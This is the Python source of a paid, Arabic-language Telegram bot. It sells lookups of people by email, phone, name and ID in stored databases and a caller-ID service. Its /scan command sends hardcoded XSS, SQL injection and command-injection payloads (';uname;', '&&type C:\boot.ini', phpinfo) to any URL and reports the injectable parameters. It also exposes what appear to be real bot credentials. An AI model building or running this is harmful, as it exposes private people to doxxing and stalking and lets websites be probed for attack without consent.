
import os
import re
import requests
import threading
import pandas as pd
import json
import shutil
from time import time
from pyrogram import Client, filters, enums
from pyrogram.types import ReplyKeyboardMarkup, InlineKeyboardMarkup, InlineKeyboardButton
from py7zr import unpack_7zarchive
import patoolib

# إعدادات البوت
sudo = 6358035274  # يجب تغيير هذا إلى معرف المستخدم الخاص بك
ManagementGP = '-100-ID-Group'
Your_Channel = "Telegram"
api_id = 18597547
api_hash = "e859cd4d9089fe580b0599b0b4cfb125"
bot_token = "7823594166:AAG5HvvfOnliCBVKu9VsnzmCgrQb68m91go"
app = Client("BotSearch", api_id=api_id, api_hash=api_hash, bot_token=bot_token)

# إعدادات قاعدة البيانات
folderDB = "Big_DB"
DB_FILE = 'db.json'
last_search_time = 0
last_print_time = 0
search_lock = threading.Lock()
search_threads = []

if not os.path.exists(folderDB):
    os.makedirs(folderDB)

if not os.path.exists(DB_FILE) or os.path.getsize(DB_FILE) == 0:
    data = {'developers': [], 'subscribers': [], 'users': [], 'banned': []}
    with open(DB_FILE, 'w') as f:
        json.dump(data, f, indent=4)
else:
    with open(DB_FILE, 'r') as f:
        try:
            data = json.load(f)
        except json.decoder.JSONDecodeError:
            data = {'developers': [], 'subscribers': [], 'users': [], 'banned': []}

def save_data(data):
    with open(DB_FILE, 'w') as f:
        json.dump(data, f, indent=4)

def userRole(user_id, role):
    return role in data and user_id in data[role]

def add_user(user_id, user_type):
    user_id = int(user_id)
    if data.get(user_type) is None:
        data[user_type] = []
    if user_id not in data[user_type]:
        data[user_type].append(user_id)
        save_data(data)
        return True
    return False

# دوال الفحص
def headers_reader(url):
    response = requests.get(url)
    if response.status_code == 200:
        return "Status code: 200 OK"
    elif response.status_code == 404:
        return "Page was not found! Please check the URL."
    
    host = url.split("/")[2]
    server = response.headers.get("Server", "Unknown")
    return f"Host: {host}, WebServer: {server}"

def main_function(url, payloads, check):
    vuln = 0
    response = requests.get(url)
    if response.status_code == 999:
        return "WebKnight WAF Detected! Delaying requests."

    results = []
    for params in url.split("?")[1].split("&"):
        for payload in payloads:
            bugs = url.replace(params, params + str(payload).strip())
            request = requests.get(bugs)
            for line in request.text.splitlines():
                checker = re.findall(check, line)
                if len(checker) != 0:
                    results.append(f"[*] Payload Found: {payload}\n[*] POC: {bugs}")
                    vuln += 1
    if vuln == 0:
        return "Target is not vulnerable!"
    else:
        return f"Congratulations! You've found {vuln} bugs:\n" + "\n".join(results)

def rce_func(url):
    header_info = headers_reader(url)
    payloads = [';${@print(md5(dadevil))}', ';${@print(md5("dadevil"))}', '%253B%2524%257B%2540print%2528md5%2528%2522zigoo0%2522%2529%2529%257D%253B',
                ';uname;', '&&dir', '&&type C:\\boot.ini', ';phpinfo();', ';phpinfo']
    check = re.compile("51107ed95250b4099a0f481221d56497|Linux|eval\(\)|SERVER_ADDR|Volume.+Serial|\[boot", re.I)
    return f"{header_info}\n" + main_function(url, payloads, check)

def xss_func(url):
    payloads = ['%27%3Edadevil0%3Csvg%2Fonload%3Dconfirm%28%2Fdadevil%2F%29%3Eweb', '%78%22%78%3e%78',
                '%22%3Edadevil%3Csvg%2Fonload%3Dconfirm%28%2Fdadevil%2F%29%3Eweb', 'dadevil%3Csvg%2Fonload%3Dconfirm%28%2Fdadevil%2F%29%3Eweb']
    check = re.compile('dadevil<svg|x>x', re.I)
    return main_function(url, payloads, check)

def error_based_sqli_func(url):
    payloads = ["3'", "3%5c", "3%27%22%28%29", "3'><", "3%22%5C%27%5C%22%29%3B%7C%5D%2A%7B%250d%250a%3C%2500%3E%25bf%2527%27"]
    check = re.compile("Incorrect syntax|Syntax error|Unclosed.+mark|unterminated.+qoute|SQL.+Server|Microsoft.+Database|Fatal.+error", re.I)
    return main_function(url, payloads, check)

@app.on_message(filters.command(["scan"], prefixes=["/"]))
def scan(app, msg):
    user_id = msg.from_user.id
    if len(msg.command) >= 2 and (userRole(user_id, 'developers') or user_id == sudo):
        url = msg.text.split()[1]
        results = []
        
        # فحص XSS
        xss_results = xss_func(url)
        results.append(xss_results)

        # إذا لم يتم العثور على ثغرات XSS، تحقق من SQL injection
        if "not vulnerable" in xss_results:
            sql_results = error_based_sqli_func(url)
            results.append(sql_results)

        # إذا تم العثور على ثغرات XSS، انتقل إلى RCE
        if "Payload Found" in xss_results:
            rce_results = rce_func(url)
            results.append(rce_results)

        app.send_message(msg.chat.id, "\n".join(results), reply_to_message_id=msg.id)
    else:
        msg.reply_text("يجب إدخال URL للفحص أو أنك لا تملك الصلاحية لاستخدام هذا الأمر.", reply_to_message_id=msg.id)

# متابعة باقي الكود مع التأكد من وجود جميع الوظائف الأساسية
@app.on_message(filters.command(["search"]))
def search_and_send(app, msg):
    user_id = msg.from_user.id
    if not userRole(user_id, 'banned'):        
        if userRole(user_id, 'subscribers') or userRole(user_id, 'developers') or user_id == sudo:
            if len(msg.command) >= 2:
                search_term = msg.text.split(" ", 1)[1]
                if re.match(r"[\w\.-]+@[\w\.-]+", search_term) or re.match(r"\+?\d{6,}", search_term):
                    thread = threading.Thread(target=perform_search, args=(msg, search_term))
                    thread.start()
                    search_threads.append(thread)
                else:
                    app.send_message(msg.chat.id, "يجب أن يكون البحث بريد إلكتروني أو رقم هاتف.", reply_to_message_id=msg.id)
            else:
                msg.reply_text("يجب ادخال قيمة البحث", reply_to_message_id=msg.id)
        else:
            msg.reply("يجب عليك الاشتراك لتتمكن من استخدام الخدمة.", reply_to_message_id=msg.id)
    else:
        msg.reply("❌ انت محظور", reply_to_message_id=msg.id)

def perform_search(msg, search_term):
    global search_lock
    with search_lock:  
        S_msg = app.send_message(msg.chat.id, f"جارٍ البحث عن '{search_term}' ...", reply_to_message_id=msg.id)
        directory = f"{folderDB}/"
        search_files(directory, search_term, msg)
        app.delete_messages(msg.chat.id, S_msg.id)
        search_threads.remove(threading.current_thread())

@app.on_message(filters.command(["name", "num"], prefixes=["/"]))
def search_user(app, msg):
    user_id = msg.from_user.id
    if not userRole(user_id, 'banned'):
        if userRole(user_id, 'developers') or user_id == sudo or userRole(user_id, 'subscribers'):
            if len(msg.command) >= 2:
                query_type = msg.command[0].lower()
                query_value = " ".join(msg.command[1:]) 
                if query_type == "name" and not query_value.isdigit():
                    num_words = len(query_value.split())
                    if 2 <= num_words <= 4:
                        name = query_value
                        url = f"https://caller-id.saedhamdan.com/index.php/UserManagement/search_number?country_code=SA&name={name}"
                        search_title = name.replace(" ", "-")
                    else:
                        app.send_message(chat_id=msg.chat.id, text="⚠️ يجب أن يحتوي البحث على 2 أو 4 اسماء.")
                        return
                elif query_type == "num":
                    if query_value.isdigit():
                        number = query_value
                        url = f"https://caller-id.saedhamdan.com/index.php/UserManagement/search_number?country_code=SA&number={number}"
                        search_title = f"Number-{number}"
                    else:
                        app.send_message(chat_id=msg.chat.id, text="⚠️ يجب أن يكون البحث برقم هاتف فقط.")
                        return
                else:
                    return
                response = requests.get(url)
                data = response.json()
                if data['response'] == '0':
                    results = data['result']
                    message = []
                    for result in results:
                        number = result['number']
                        country_code = result['country_code']
                        address = result['address']
                        name = result['name']
                        id = result['id']
                        message.append({
                            "name": name,
                            "number": number,
                            "country_code": country_code,
                            "address": address,
                            "id": id
                        })
                    filename = save_to_html(message, search_title)
                    if os.path.exists(filename):
                        app.send_document(msg.chat.id, document=filename, caption="✅ نتائج البحث",reply_to_message_id=msg.id)
                        os.remove(filename)
                else:
                    app.send_message(chat_id=msg.chat.id, text="❌ المستخدم غير موجود",reply_to_message_id=msg.id)
            else:
                app.send_message(chat_id=msg.chat.id, text="⚠️ يرجى تقديم استعلام صحيح",reply_to_message_id=msg.id)
        else:
            app.send_message(chat_id=msg.chat.id, text="⚠️ يجب عليك الاشتراك",reply_to_message_id=msg.id)
    else:
        app.send_message(chat_id=msg.chat.id, text="❌ انت محظور",reply_to_message_id=msg.id)

@app.on_message(filters.private & filters.command(["start"], prefixes=["/", "!"]))
def start_message(app, msg):
    user_id = msg.from_user.id
    fname = msg.from_user.first_name
    lname = msg.from_user.last_name
    name = f"{fname} {lname}"
    start_keyboard = [
        [InlineKeyboardButton("عن الخدمة ℹ️", callback_data="AboutService")],
        [InlineKeyboardButton(f"إشتراك 📋", callback_data="Subscribe")],
        [InlineKeyboardButton("المطور 👨‍💻", url="t.me/KARTNS")],
    ]
    start_reply_markup = InlineKeyboardMarkup(start_keyboard)
    start_kVisit = [
        [InlineKeyboardButton(f"{name}", url=f"t.me/{msg.from_user.username}")],
    ]
    start_send_markup = InlineKeyboardMarkup(start_kVisit)
    help_keyboard = [
        [InlineKeyboardButton(f"مساعدة ❓", callback_data="Help")],
        [InlineKeyboardButton("تواصل معنا 📞", url="t.me/KARTNS")],
    ]
    help_reply_markup = InlineKeyboardMarkup(help_keyboard)
    welcome_message = f"""
مرحبا بك في البوت!

اهلاً بك {name}، 

للشراء تواصل معنا عبر:
Instagram: [0u00](https://instagram.com/0u00)
Telegram: [KARTNS](https://t.me/KARTNS)

نتمنى لك يوما سعيدا! ☀️
    """
    if not userRole(user_id, 'banned'):
        if not userRole(user_id, 'users') and not userRole(user_id, 'subscribers') and not userRole(user_id, 'developers') and not user_id == sudo:
            add_user(user_id, 'users')
            msg.reply(welcome_message.format(name=name), reply_markup=start_reply_markup, disable_web_page_preview=True)
            app.send_message(sudo, f"You have Visit\n name:{name}\nlang: {msg.from_user.language_code}", help_reply_markup=start_send_markup)

        elif userRole(user_id, 'developers') or user_id == sudo:
            msg.reply(f"مرحبا بك مجددا عزيزي {name}! 🎉🥳\nيمكنك إرسال /help ليتم عرض الأوامر الخاصة بك")
        elif userRole(user_id, 'subscribers'):
            msg.reply(f"مرحبا بك مجددا عزيزي المشترك {name}! 🎉\nيمكنك الإطلاع على دليل الإستخدام بالضغط على زر المساعدة\nإن واجهتك مشكلة لا تترد في التواصل معنا . ",help_reply_markup=help_reply_markup)
        else:
            msg.reply(welcome_message.format(name=name), reply_markup=start_reply_markup, disable_web_page_preview=True)
    else:
        msg.reply("لقد تم حظرك من استخدام البوت. يرجى التواصل مع الإدارة للمزيد من المعلومات. 🚫")

    @app.on_callback_query()
    def handle_button(app, callback_query):
        user_id = callback_query.from_user.id
        fname = callback_query.from_user.first_name
        lname = callback_query.from_user.last_name
        name = f"{fname} {lname}"
        query = callback_query

        back_keyboard = [[InlineKeyboardButton("Back ", callback_data="Back_msg")]]
        back_reply_markup = InlineKeyboardMarkup(back_keyboard)

        if query.data == "Back_msg":
            query.edit_message_text(welcome_message.format(name=name), reply_markup=start_reply_markup, disable_web_page_preview=True)        
        if query.data == "AboutService":
            query.edit_message_text("""
الخدمة المتوفرة حاليا :

- بحث ايميل 1 ( جميع الدول )
- بحث رقم هوية 2 ( العراق و السعودية فقط )
- بحث رقم جوال 3 ( العراق و السعودية فقط )
- بحث اسم 4 ( متوفر لـ جميع دول العالم ) ومنه استخراج رقم ولي الامر
                                
""", reply_markup=back_reply_markup)
        if query.data == "Help":
            query.edit_message_text("""
/search {Mail or Phone}: For search in DB.
/num {Phone}: For Search in [Zain and NumberBook].
/name {Name}: For Search in [Zain and NumberBook].
/scan {URL}: For scanning for vulnerabilities.
/files: Show all uploaded files.
/delf {Name file}: For deleting a file.
/info: Show user info.
/add {idUser}: Add subscription to a user.
/del {idUser}: Remove subscription from a user.
""")
        if query.data == "Subscribe":
            if userRole(user_id, 'users'):
                query.edit_message_text("تم إرسال طلب الاشتراك.\nسيتم الرد عليك قريبا...", reply_markup=back_reply_markup)
                app.send_photo(ManagementGP, "AddSubscribers.jpg", caption=f"طلب اشتراك جديد\nمرسل الطلب: {callback_query.from_user.mention(style='markdown')}\nلقبول الاشتراك ارسل `/add {user_id}`", parse_mode=enums.ParseMode.MARKDOWN)
            else:
                query.edit_message_text("انت مشترك بالفعل في البوت.", reply_markup=back_reply_markup)

@app.on_message(filters.command("files", ["!", "/"]))
def print_files(app, msg):
    user_id = msg.from_user.id
    if userRole(user_id, 'developers') or user_id == sudo: 
        files_structure = get_files_structure(folderDB)
        if files_structure.strip():
            msg.reply_text(files_structure, reply_to_message_id=msg.id)
        else:
            msg.reply_text("مجلد قواعد البيانات فارغ.", reply_to_message_id=msg.id)
    else:
        msg.reply_text("❌ أنت لست مسؤولاً.", reply_to_message_id=msg.id)

def get_files_structure(directory):
    files_structure = ""
    for root, _, files in os.walk(directory):
        level = root.replace(directory, "").count(os.sep)
        indent = "  " * level
        files_structure += f"{indent}📂 {os.path.basename(root)}\n"
        sub_indent = "  " * (level + 1)
        for file in files:
            file_path = os.path.join(root, file)
            file_size = os.path.getsize(file_path)
            formatted_size = convert_size(file_size)
            file_icon = "❌" 
            if file.endswith(".csv"):
                file_icon = "📄"
            elif file.endswith(".json"):
                file_icon = "📑"
            elif file.endswith((".xls", ".xlsx")):
                file_icon = "📊"
            elif file.endswith(".zip"):
                file_icon = "📦"
            elif file.endswith(".txt"):
                file_icon = "📜"
            files_structure += f"{sub_indent}┗ {file_icon} {file} \t| {formatted_size}\n"
    return files_structure

def convert_size(size_bytes):
    units = ['Bytes', 'KB', 'MB', 'GB', 'TB']
    unit = 0
    while size_bytes >= 1024 and unit < len(units)-1:
        size_bytes /= 1024
        unit += 1
    return f"{size_bytes:.2f} {units[unit]}"

@app.on_message(filters.command("delf", ["!", "/"]))
def delete_file(app, msg):
    global last_search_time
    current_time = time()
    user_id = msg.from_user.id
    if len(msg.command) >= 2:
        file_name = msg.command[1]
        if msg.id and (userRole(user_id, 'developers') or user_id == sudo): 
            if current_time - last_search_time < 10:
                app.send_message(msg.chat.id, "يرجى الانتظار حتى يتم إنهاء من عملية الحذف الأولى", reply_to_message_id=msg.id)
                return
            last_search_time = current_time
            file_path = os.path.join(folderDB, file_name)
            if os.path.exists(file_path):
                with open(file_path, 'rb') as file:
                    app.send_document(msg.chat.id, file, caption=f"نسخة إحتياطية {file_name}", reply_to_message_id=msg.id)
                    deleted = delete_file_by_name(file_name)
                    msg.reply_text(f"تم حذف قاعدة البيانات '{file_name}' بنجاح.",reply_to_message_id=msg.id)
            else:
                msg.reply_text(f"لم يتم العثور على قاعدة البيانات '{file_name}'.",reply_to_message_id=msg.id)
        else:
            msg.reply_text("You are not admin.",reply_to_message_id=msg.id)
    else:
        msg.reply_text("يرجى إدخال اسم قاعدة البيانات",reply_to_message_id=msg.id)

@app.on_message(filters.command("info", ["!", "/"]))
def count_users(app, msg):
    user_id = msg.from_user.id
    if userRole(user_id, 'developers') or user_id == sudo:
        user_count = len(data['users'])
        subscribers_count = len(data['subscribers'])
        banned_count = len(data['banned'])
        developers_count = len(data['developers'])
        msg.reply(f"عدد المستخدمين: {user_count}\nعدد المشتركين: {subscribers_count}\nعدد المحظورين: {banned_count}\nعدد المطورين: {developers_count}", reply_to_message_id=msg.id)
    else:
        msg.reply_text("You are not admin.",reply_to_message_id=msg.id)

@app.on_message(filters.command(["db"], prefixes=["/", "!"]))
def mention_all(app, msg):
    user_id = msg.from_user.id
    if user_id == sudo:
        app.send_document(msg.chat.id, document=DB_FILE, caption="✅Data Users ",reply_to_message_id=msg.id)
    else:
       msg.reply("⛔️ ليس لديك الصلاحية.")

@app.on_message(filters.command("add", prefixes=["/"]))
def addNew_user(app, msg):
    user_id = msg.from_user.id
    if len(msg.command) >= 2:
        NewUser = msg.command[1]
        if user_id == sudo or userRole(user_id, 'developers'):
            if NewUser.isdigit():
                NewUser = int(NewUser)
                if not userRole(NewUser, 'banned'):
                    if not userRole(NewUser, 'subscribers'):
                        if userRole(NewUser, 'users'):
                            if NewUser in data['users']:
                                data['users'].remove(NewUser)
                            data['subscribers'].append(NewUser)
                            save_data(data)
                            user_info = app.get_users(NewUser)
                            NewUser_name = user_info.first_name if user_info else NewUser
                            msg.reply(f"✅ تمت إضافة {NewUser_name} إلى قائمة المشتركين.", reply_to_message_id=msg.id)
                            app.send_message(NewUser, "🎉 تم تفعيل إشتراكك بنجاح!")
                        else:
                            msg.reply(f"❌ لا يوجد هذا المستخدم {NewUser} .")
                    else:
                        msg.reply(f"ℹ️ تم تفعيل إشتراك {NewUser} مسبقا.", reply_to_message_id=msg.id)
                else:
                    msg.reply(f"❌ المستخدم {NewUser} محظور. يرجى إلغاء الحظر أولاً.", reply_to_message_id=msg.id)
            else:
                msg.reply("❌ يرجى إدخال ايدي المستخدم بشكل صحيح.", reply_to_message_id=msg.id)
        else:
            msg.reply("⛔️ ليس لديك الصلاحية لإضافة إشتراكات.")
    else:
        msg.reply("يرجى إدخال ID المستخدم بعد الأمر ℹ️ .")

@app.on_message(filters.command("del", prefixes=["/"]))
def delete_user(app, msg):
    user_id = msg.from_user.id
    if len(msg.command) >= 2:
        deluser = msg.command[1]
        if user_id == sudo or userRole(user_id, 'developers'):
            if deluser.isdigit():
                deluser = int(deluser)
                if deluser in data['subscribers']:
                    data['subscribers'].remove(deluser)
                    data['users'].append(deluser)
                    save_data(data)
                    user_info = app.get_users(deluser)
                    deluser_name = user_info.first_name if user_info else deluser
                    msg.reply(f"تم إالغاء إشتراك {deluser_name} بنجاح ✅.", reply_to_message_id=msg.id)
                    app.send_message(deluser, "تم إنتهاء اشتراكك في الخدمة 🚫")
                else:
                    msg.reply(f"المستخدم {deluser} غير مشترك فعلا.", reply_to_message_id=msg.id)
            else:
                msg.reply("قم بإدخال ID المستخدم بالشكل الصحيح ℹ️", reply_to_message_id=msg.id)
        else:
            msg.reply("⛔️ ليس لديك الصلاحية لحذف الاشتراكات.", reply_to_message_id=msg.id)
    else:
        msg.reply("يرجى إدخال ID المستخدم بعد الأمر ℹ️ .", reply_to_message_id=msg.id)

@app.on_message(filters.command("ban", prefixes=["/"]))
def ban_user(app, msg):
    user_id = msg.from_user.id
    if len(msg.command) >= 2:
        banuser = msg.command[1]
        if user_id == sudo:
            if banuser.isdigit():
                banuser = int(banuser)
                if not userRole(banuser, 'banned'):
                    if userRole(banuser, 'users') or userRole(banuser, 'developers') or userRole(banuser, 'subscribers'):
                        if banuser in data['users']:
                            data['users'].remove(banuser)
                        if banuser in data['developers']:
                            data['developers'].remove(banuser)
                        if banuser in data['subscribers']:
                            data['subscribers'].remove(banuser)
                        data['banned'].append(banuser)
                        save_data(data)
                        user_info = app.get_users(banuser)
                        banuser_name = user_info.first_name if user_info else banuser
                        msg.reply(f"✅ تم حظر {banuser_name}.", reply_to_message_id=msg.id)
                        app.send_message(banuser, "تم حظرك من البوت 🚫")
                    else:
                        msg.reply(f"❌ لا يوجد هذا المستخدم {banuser} .")
                else:
                    msg.reply(f"❌ المستخدم {banuser} محظور بالفعل.")
            else:
                msg.reply("❌ يجب إدخال ايدي المستخدم")
        else:
            msg.reply("⛔️ ليس لديك الصلاحية لحظر المستخدمين.")
    else:
        msg.reply("يرجى إدخال ID المستخدم بعد الأمر ℹ️ .")

@app.on_message(filters.command("unban", prefixes=["/"]))
def unban_user(app, msg):
    user_id = msg.from_user.id
    if len(msg.command) >= 2:
        unban_user_id = msg.command[1]
        if user_id == sudo:
            if unban_user_id.isdigit():
                unban_user_id = int(unban_user_id)
                if userRole(unban_user_id, 'banned'):
                    data['banned'].remove(unban_user_id)
                    data['users'].append(unban_user_id)
                    save_data(data)
                    user_info = app.get_users(unban_user_id)
                    unban_user_name = user_info.first_name if user_info else unban_user_id
                    msg.reply(f"✅ تم فك حظر {unban_user_name}.", reply_to_message_id=msg.id)
                    app.send_message(unban_user_id, "✅ تم فك حظرك من البوت، أهلاً بك مجدداً!")
                else:
                    msg.reply(f"❌ المستخدم {unban_user_id} غير محظور.")
            else:
                msg.reply("❌ يجب إدخال ايدي المستخدم.")
        else:
            msg.reply("⛔️ ليس لديك الصلاحية لفك حظر المستخدمين.")
    else:
        msg.reply("يرجى إدخال ID المستخدم بعد الأمر ℹ️ .")

@app.on_message(filters.command("addDev", prefixes=["/"]))
def add_developer(app, msg):
    user_id = msg.from_user.id
    if len(msg.command) >= 2:
        NewUser = msg.command[1]
        if user_id == sudo:
            if NewUser.isdigit():
                NewUser = int(NewUser)
                if not userRole(NewUser, 'banned'):
                    if not userRole(NewUser, 'developers') and userRole(NewUser, 'users'):
                        if NewUser in data['users']:
                            data['users'].remove(NewUser)
                        data['developers'].append(NewUser)
                        save_data(data)
                        user_info = app.get_users(NewUser)
                        NewUser_name = user_info.first_name if user_info else NewUser
                        msg.reply(f"✅ تمت إضافة {NewUser_name} إلى قائمة المطورين.", reply_to_message_id=msg.id)
                        app.send_message(NewUser, "🎉 تم ترقيتك مطور في البوت\n ارسل \help لتتمكن من معرفة الاوامر المتاحة لك!")
                    else:
                        msg.reply(f"ℹ️ تم رفعه كمطور {NewUser} مسبقا.", reply_to_message_id=msg.id)
                else:
                    msg.reply(f"❌ المستخدم {NewUser} محظور. يرجى إلغاء الحظر أولاً.", reply_to_message_id=msg.id)
            else:
                msg.reply("❌ يرجى إدخال ايدي المستخدم بشكل صحيح.", reply_to_message_id=msg.id)
        else:
            msg.reply("⛔️ ليس لديك الصلاحية لإضافة إشتراكات.")
    else:
        msg.reply("يرجى إدخال ID المستخدم بعد الأمر ℹ️ .")

@app.on_message(filters.command("delDev", prefixes=["/"]))
def delete_developer(app, msg):
    user_id = msg.from_user.id
    if len(msg.command) >= 2:
        delDev_user = msg.command[1]
        if user_id == sudo:
            if delDev_user.isdigit():
                delDev_user = int(delDev_user)
                if delDev_user in data['developers']:
                    data['developers'].remove(delDev_user)
                    if delDev_user not in data['users']:
                        data['users'].append(delDev_user)
                    msg.reply(f"✅ تمت إزالة المستخدم {delDev_user} من قائمة المطورين.", reply_to_message_id=msg.id)
                    app.send_message(delDev_user, "🤕 لم تعد مطورا لقد تمت إزالتك .")
                else:
                    msg.reply(f"ℹ️ المستخدم {delDev_user} غير موجود في قائمة المطورين.", reply_to_message_id=msg.id)
            else:
                msg.reply("قم بإدخال ID المستخدم بالشكل الصحيح ℹ️", reply_to_message_id=msg.id)
        else:
            msg.reply("⛔️ ليس لديك الصلاحية لإزالة المطورين.", reply_to_message_id=msg.id)
    else:
        msg.reply("ℹ️ يرجى إدخال ID الحساب بعد الأمر.", reply_to_message_id=msg.id)

@app.on_message(filters.command(["help"], prefixes=["/", "!"]))
def Help(app, msg):
    user_id = msg.from_user.id
    if userRole(user_id, 'developers'):
        msg.reply("""
/search {Mail or Phone}: For search in DB.
/num {Phone}: For Search in [Zain and NumberBook].
/name {Name}: For Search in [Zain and NumberBook].
/scan {URL}: For scanning for vulnerabilities.
/files: Show all uploaded files.
/delf {Name file}: For deleting a file.
/info: Show user info.
/add {idUser}: Add subscription to a user.
/del {idUser}: Remove subscription from a user.
""", reply_to_message_id=msg.id)
    elif user_id == sudo:
        msg.reply("""
/search {Mail or Phone}: For search in DB.
/num {Phone}: For Search in [Zain and NumberBook].
/name {Name}: For Search in [Zain and NumberBook].
/scan {URL}: For scanning for vulnerabilities.
/files: Show all uploaded files.
/delf {Name file}: For deleting a file.
/info: Show user info.
/add {idUser}: Add subscription to a user.
/del {idUser}: Remove subscription from a user.
/ban {idUser}: Ban a user.
/addDev {idUser}: Add a developer.
/db: Get user data file.
""", reply_to_message_id=msg.id)

app.run()
